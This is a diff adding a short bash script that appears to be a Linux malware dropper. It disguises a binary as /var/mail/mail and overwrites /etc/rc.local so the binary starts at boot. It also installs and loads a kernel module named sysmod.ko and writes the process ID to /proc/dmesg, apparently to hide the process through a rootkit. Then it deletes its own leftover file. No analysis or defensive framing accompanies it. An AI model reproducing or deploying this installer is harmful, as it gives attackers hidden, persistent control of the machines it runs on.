@@ -1,0 +1,13 @@
+#!/bin/bash
+
+mv 1 /var/mail/mail
+chmod +x /var/mail/mail
+echo -e "/var/mail/mail &\nsleep 1\npidof mail > /proc/dmesg\nexit 0" > /etc/rc.local
+nohup /var/mail/mail > /dev/null 2>&1&
+mv 2 /lib/modules/`uname -r`/sysmod.ko
+depmod -a
+echo "sysmod" >> /etc/modules
+modprobe sysmod
+sleep 1
+pidof mail > /proc/dmesg
+rm 3
